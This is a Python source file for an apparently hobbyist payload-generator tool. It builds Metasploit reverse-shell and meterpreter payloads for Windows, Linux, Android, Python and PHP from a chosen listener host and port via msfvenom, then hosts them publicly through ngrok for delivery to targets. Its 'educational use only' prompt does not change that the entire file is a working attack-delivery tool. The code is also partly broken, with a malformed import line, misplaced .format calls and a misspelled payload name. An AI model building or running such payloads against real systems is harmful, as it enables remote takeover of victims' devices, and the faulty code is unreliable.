import os, platform,
import platform
import wget
from SimpleHTTPServer import test
from sys import exit
from time import sleep

red= '\033[91m'
orange= '\33[38;5;208m'
green= '\033[92m'
cyan= '\033[36m'
bold= '\033[1m'
end= '\033[0m'

print("TOOL CREATED BY KRISHNA PRANAV")
print("Github Link >> www.github.com/krishpranav")

def disclaimer():
    print('This tool was developed for learning purposes only and the use is complete responsibility of the end-user. Do you accept to cause no harm to any machine and use this tool for educational purposes only ? {0}(yes/no){1}').format(bold, end)
    if input("\n{0}{1}PAYLOAD#{2} ".format(green, bold, end)) == 'yes':
        print('{0}Proceeding...{1}').format(green, end)
        sleep(1)
    else:
        print('{0}You must accept the terms and conditions to use this tool.{1}').format(red, end)
        exit(0)

def finish():
    print('{0}Until next time...{1}').format(green, end)
    exit(0)

def present():
    if os.path.isfile('/usr/bin/msfvenom') == False:
        print('{0}Failed to locate msfvenom. Make sure Metasploit-Framework is installed correctly and try again.{1}').format(red, end)
        exit(0)
    if os.path.isdir('output') == False:

        print('{0}Creating output directory{1}').format(green, end)
        os.makedirs('output')
        sleep(1)
    if os.path.isfile('ngrok') == False:

        print("{0}Downloading Ngrok...{1}").format(green, end)
        if platform.architecture == "32bit":
            wget.download('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.tgz')
            os.system('tar -xf ngrok-stable-linux-386.tgz')
            os.system('rm ngrok-stable-linux-386.tgz')
        else:
            wget.download('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.tgz')
            os.system('tar -xf ngrok-stable-linux-amd64.tgz')
            os.system('rm ngrok-stable-linux-amd64.tgz')

def server():
    os.system('cd output/ && python -m SimpleHTTPServer 80')

def ngrok():

    try:
        os.system('./ngrok http 80 > /dev/null &')
        sleep(5)
        os.system('curl -s -N http://127.0.0.1:4040/status | grep "http://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
        sleep(5)
        url = open('ngrok.url', 'r')
        print('\nNgrok Url:{0} ' + url.read() + '{1}').format(cyan, end)
        os.system('cd output/ && python -m SimpleHTTPServer 80 &')
        sleep(5)
        input('Hit {0}(Return){1} to stop the server and return back to Main Menu'.format(bold, end))
        os.system('pkill -f "python -m SimpleHTTPServer 80"')
        os.system('pkill -f ngrok')
        url.close()
        choosepayload()
    except KeyboardInterrupt:
        os.system('pkill -f "python -m SimpleHTTPServer 80"')
        os.system('pkill -f ngrok')
        finish()

def main(platform, type):
    lhost = input("\nEnter your LHOST\n{0}{1}SPG:~/LHOST#{2} ".format(green, bold, end))
    lport = input("\nEnter your LPORT\n{0}{1}SPG:~/LPORT#{2} ".format(green, bold, end))
    output = input("\nEnter the name of output file\n{0}{1}SPG:~/output#{2} ".format(green, bold, end))
    #windows
    if platform == 'Windows' and type == '1':
        payload= 'windows/meterpreter/reverse_http'
        format= 'exe'
        extension= '.exe'
    if platform == 'Windows' and type == '2':
        payload= 'windows/meterpreter/reverse_https'
        format= 'exe'
        extension= '.exe'
    if platform == 'Windows' and type == '3':
        payload= 'windows/meterpreter/reverse_tcp'
        format= 'exe'
        extension= '.exe'
    #linux
    if platform == 'Linux' and type == '1':
        payload= 'linux/x86/shell/reverse_tcp'
        format= 'elf'
        extension= '.elf'
    if platform == 'Linux' and type == '2':
        payload= 'linux/x86/meterpreter/reverse_tcp'
        format= 'elf'
        extension= '.elf'
    #Android
    elif platform == 'Android' and type == '1':
        payload= 'android/meterpreter/reverse_http'
        format= 'raw'
        extension= '.apk'
    elif platform == 'Android' and type == '2':
        payload= 'android/meterpreter/reverse_https'
        format= 'raw'
        extension= '.apk'
    elif platform == 'Android' and type == '3':
        payload= 'android/meterpreter/reverse_tcp'
        format= 'raw'
        extension= '.apk'
    #Python
    elif platform == 'Python' and type == '1':
        payload= 'python/meterpreter/reverse_http'
        format= 'raw'
        extension= '.py'
    elif platform == 'Python' and type == '2':
        payload= 'python/meterpreter/reverse_https'
        format= 'raw'
        extension= '.py'
    elif platform == 'Python' and type == '3':
        payload= 'python/meterpreter/reverse_tcp'
        format= 'raw'
        extension= '.py'
    #PHP
    elif platform == 'PHP' and type == '1':
        payload= 'php/meterpreter/reverse_tcp'
        format= 'raw'
        extension= '.php'
    os.system('msfvenom -p '+payload+' LHOST='+lhost+' LPORT='+lport+' -f'+format+' -o output/'+output+extension)
    sleep(3)
    if os.path.isfile('output/'+output+extension) == False:

        input('{2}Failed to create payload, please try again.{1} {0}(Hit Enter to continue){1}'.format(bold, end, red))
        choosepayload()
    else:
        def server_start():

            http_server = input('Your payload has been sucessfully generated in the output directory. Do you want to start Ngrok server now ? {1}(y/n){2}\n{0}{1}SPG:~#{2} '.format(green, bold, end))
            if http_server == 'y' or http_server == 'Y':
                ngrok()
            elif http_server == 'n' or http_server == 'N':
                choosepayload()
            else:
                input('Please Choose a Valid option {0}(Hit Return to continue){1}'.format(bold, end))
                server_start()
        server_start()

def choosepayload():

    select = input('{2}Choose a payload platform:{1}\n\n{0}[{1}1{0}]{1} Windows\n{0}[{1}2{0}]{1} Linux\n{0}[{1}3{0}]{1} Android\n{0}[{1}4{0}]{1} Python\n{0}[{1}5{0}]{1} PHP\n{0}[{1}6{0}]{1} Start Ngrok Server\n{0}[{1}0{0}]{1} Exit\n\n{0}{2}SPG:~#{1} '.format(green, end, bold))
    if select == '1':

        type = input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} windows/meterpreter/reverse_http\n{0}[{1}2{0}]{1} windows/meterpreter/reverse_https\n{0}[{1}3{0}]{1} windows/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}SPG:~/Windows#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Windows', type)
    elif select == '2':

        type = input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} linux/x86/shell/reverse_tcp\n{0}[{1}2{0}]{1} linux/x86/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}SPG:~/Linux#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Linux', type)
    elif select == '3':
 
        type = input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} android/meterpreter/reverse_http\n{0}[{1}2{0}]{1} android/meterpreter/reverse_https\n{0}[{1}3{0}]{1} android/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}SPG:~/Android#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Android', type)
    elif select == '4':
 
        type = input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} python/meterpreter/reverse_http\n{0}[{1}2{0}]{1} python/meterpreter/reverse_https\n{0}[{1}3{0}]{1} python/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}SPG:~/Python#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('Python', type)
    elif select == '5':

        type = input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} php/meterprter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}SPG:~/PHP#{1} '.format(green, end, bold))
        if type == '0':
            choosepayload()
        main('PHP', type)
    elif select == '6':
        ngrok()
    elif select == '0':
        finish()
    else:

        print('{0}Please choose a valid option.{1}').format(red, end)
        sleep(2)
        choosepayload()

if __name__ == "__main__":
    try:

        disclaimer()
        present()
        choosepayload()
    except KeyboardInterrupt:
        finish()